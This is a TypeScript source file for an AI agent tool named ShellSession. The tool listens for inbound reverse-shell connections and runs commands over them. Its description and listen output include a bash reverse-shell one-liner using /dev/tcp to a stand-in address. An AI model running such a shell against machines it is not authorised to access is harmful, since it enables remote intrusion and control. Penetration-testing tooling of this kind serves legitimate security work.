/**
 * ShellSession — persistent shell session management.
 *
 * Maintains a persistent TCP listener for inbound connections (e.g. reverse
 * shells) and supports multiple exec calls against an established session.
 */

import * as net from 'net'
import * as fs from 'fs'
import * as path from 'path'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'
import type { ResourceClaim } from '../core/executionRun.js'
import { str } from '../core/strings.js'

interface ShellConn {
  id:           string
  port:         number
  server:       net.Server
  socket:       net.Socket | null
  connectedAt:  Date | null
  logFile:      string
  logStream:    fs.WriteStream | null
}

const _sessions = new Map<string, ShellConn>()

function sessionId(port: number): string { return `shell_${port}` }

function resolveId(input: Record<string, unknown>): string {
  if (input.session_id) return str(input.session_id)
  if (input.port) return sessionId(Number(input.port))
  return 'shell_4444'
}

function stripPrompt(s: string): string {
  return s.replace(/\n?[^\n]*[#$>]\s*$/, '').trimEnd()
}

function stripEcho(output: string, command: string): string {
  const trimmed = output.trimStart()
  if (trimmed.startsWith(command)) return trimmed.slice(command.length).replace(/^\r?\n/, '')
  return output
}

// eslint-disable-next-line no-useless-escape -- \/ inside char class aids readability
const REGEX_SPECIAL_RE = /[-\/\\^$*+?.()|[\]{}]/g

/** Escape regex special characters in a string so it can be used in new RegExp() */
function escapeRegex(s: string): string {
  return s.replace(REGEX_SPECIAL_RE, '\\$&')
}

export class ShellSessionTool implements Tool {
  name = 'ShellSession'
  metadata = { mutatesState: true, concurrencySafe: true, longRunning: true, claims: (): ResourceClaim[] => [{ type: 'process', key: 'shell-session', access: 'exclusive' as const }] }

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'ShellSession',
      description: `Manage persistent shell sessions. Provides a TCP listener and interactive command execution.

## Actions
| action | purpose |
|--------|---------|
| listen | Start a TCP listener on a port, waiting for an inbound shell connection |
| exec   | Send a command to an established shell and get output (callable multiple times) |
| list   | List all active sessions and their status |
| kill   | Close a specific session |

## Typical workflow
1. ShellSession({ action: "listen", port: 4444 })
2. On the remote machine, initiate a connection back: bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
3. ShellSession({ action: "exec", session_id: "shell_4444", command: "id" })`,
      parameters: {
        type: 'object',
        properties: {
          action: { type: 'string', enum: ['listen', 'exec', 'list', 'kill'], description: 'Operation type' },
          port: { type: 'number', description: 'TCP port to listen on' },
          session_id: { type: 'string', description: 'Session ID (format: shell_PORT)' },
          command: { type: 'string', description: 'Command to execute (required for exec)' },
          timeout: { type: 'number', description: 'Max wait for output in milliseconds (default 8000)' },
          log_dir: { type: 'string', description: 'Directory for session logs (default /tmp)' },
        },
        required: ['action'],
      },
    },
  }

  async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
    switch (str(input.action)) {
      case 'listen': return this._listen(input)
      case 'exec':   return this._exec(input)
      case 'list':   return this._list()
      case 'kill':   return this._kill(input)
      default:
        return { content: `Unknown action "${str(input.action)}". Use: listen | exec | list | kill`, isError: true }
    }
  }

  private _listen(input: Record<string, unknown>): Promise<ToolResult> {
    const port   = Number(input.port ?? 4444)
    const id     = sessionId(port)
    const logDir = str(input.log_dir, '/tmp')

    if (_sessions.has(id)) {
      const s = _sessions.get(id)
      // _sessions.has(id) above guarantees this is non-null, but guard
      // explicitly so a future change (e.g. removing the prior check)
      // can't crash the tool with a silent null deref.
      if (!s) {
        return Promise.resolve({
          content: `Session "${id}" lookup failed unexpectedly.`,
          isError: true,
        })
      }
      return Promise.resolve({ content: `Session "${id}" already exists (${s.socket ? 'CONNECTED' : 'LISTENING'}).`, isError: false })
    }

    return new Promise((resolve) => {
      try { fs.mkdirSync(logDir, { recursive: true }) } catch { /* ignore */ }
      const logFile   = path.join(logDir, `${id}.log`)
      const logStream = fs.createWriteStream(logFile, { flags: 'a' })

      const server = net.createServer((socket) => {
        const conn = _sessions.get(id)
        // The connection handler runs once `server.listen` resolves, and
        // `_listen` installs the session into the map inside that
        // callback. Guard explicitly so a future refactor that defers the
        // map insert (or removes the server.on('error') cleanup branch)
        // can't dereference a missing entry.
        if (!conn) {
          socket.destroy()
          return
        }
        conn.socket      = socket
        conn.connectedAt = new Date()
        const connMsg = `\n[+] Shell connected from ${socket.remoteAddress}:${socket.remotePort}\n`
        logStream.write(connMsg)
        socket.on('data', (chunk) => logStream.write(chunk))
        socket.on('close', () => { conn.socket = null; conn.connectedAt = null; logStream.write('\n[-] Shell disconnected\n') })
        socket.on('error', () => { conn.socket = null; logStream.write('\n[!] Socket error\n') })
      })

      server.on('error', () => { _sessions.delete(id); logStream.end(); resolve({ content: `Failed to listen on port ${port}`, isError: true }) })

      // Bind to loopback only. The previous 0.0.0.0 listener exposed the
      // shell socket to every network interface — a remote host on the same
      // LAN/WAN could connect and execute commands in the agent's process.
      // Loopback restricts inbound connections to the local machine; users
      // who genuinely need an externally-reachable listener can set up an
      // SSH tunnel or a reverse proxy explicitly rather than getting one by
      // default.
      server.listen(port, '127.0.0.1', () => {
        _sessions.set(id, { id, port, server, socket: null, connectedAt: null, logFile, logStream })
        resolve({
          content: [
            `[ShellSession] Listening on 127.0.0.1:${port}  (session: ${id})`,
            `Log: ${logFile}`,
            ``,
            `On the remote machine, connect back via SSH tunnel or proxy:`,
            `  ssh -L ${port}:127.0.0.1:${port} user@gateway`,
            `  bash -c 'bash -i >& /dev/tcp/127.0.0.1/${port} 0>&1'`,
            ``,
            `After connect: ShellSession({ action: "exec", session_id: "${id}", command: "id" })`,
          ].join('\n'),
          isError: false,
        })
      })
    })
  }

  private _exec(input: Record<string, unknown>): Promise<ToolResult> {
    const id      = resolveId(input)
    const command = str(input.command).trim()
    const timeout = Number(input.timeout ?? 8_000)

    if (!command) return Promise.resolve({ content: 'Error: command is required for exec', isError: true })

    const conn = _sessions.get(id)
    if (!conn) return Promise.resolve({ content: `Session "${id}" not found. Active: ${[..._sessions.keys()].join(', ') || 'none'}`, isError: true })
    if (!conn.socket) return Promise.resolve({ content: `Session "${id}" listening but no shell connected yet.`, isError: false })

    return new Promise((resolve) => {
      const socket = conn.socket!
      const chunks: Buffer[] = []
      let done = false
      let stabilize: ReturnType<typeof setTimeout> | null = null
      let timeoutTimer: ReturnType<typeof setTimeout> | null = null
      const marker = `__EOC_${Date.now().toString(36)}__`

      const finish = () => {
        if (done) return
        done = true
        if (stabilize) clearTimeout(stabilize)
        if (timeoutTimer) clearTimeout(timeoutTimer)
        socket.removeListener('data', onData)
        let output = Buffer.concat(chunks).toString('utf8')
        output = output.replace(new RegExp(escapeRegex(marker) + '\\r?\\n?', 'g'), '')
        output = stripEcho(output, command)
        output = stripPrompt(output)
        resolve({ content: output.trimEnd() || '(empty output)', isError: false })
      }

      const onData = (chunk: Buffer) => {
        chunks.push(chunk)
        const text = chunk.toString('utf8')
        if (text.includes(marker)) { if (stabilize) clearTimeout(stabilize); stabilize = setTimeout(finish, 200); return }
        if (stabilize) clearTimeout(stabilize)
        stabilize = setTimeout(finish, 400)
      }

      socket.on('data', onData)
      socket.write(command + `\necho '${marker}'\n`)
      timeoutTimer = setTimeout(finish, timeout)
    })
  }

  private _list(): ToolResult {
    if (_sessions.size === 0) return { content: 'No active sessions. Start: ShellSession({ action: "listen", port: 4444 })', isError: false }
    const lines = ['Active ShellSession sessions:']
    for (const [, s] of _sessions) {
      const state = s.socket ? `CONNECTED (since ${s.connectedAt?.toISOString()})` : `LISTENING on port ${s.port}`
      lines.push(`  ${s.id} — ${state}  log: ${s.logFile}`)
    }
    return { content: lines.join('\n'), isError: false }
  }

  private _kill(input: Record<string, unknown>): ToolResult {
    const id   = resolveId(input)
    const conn = _sessions.get(id)
    if (!conn) return { content: `Session "${id}" not found.`, isError: true }
    conn.socket?.destroy()
    conn.server.close()
    conn.logStream?.end()
    _sessions.delete(id)
    return { content: `Session "${id}" closed.`, isError: false }
  }
}
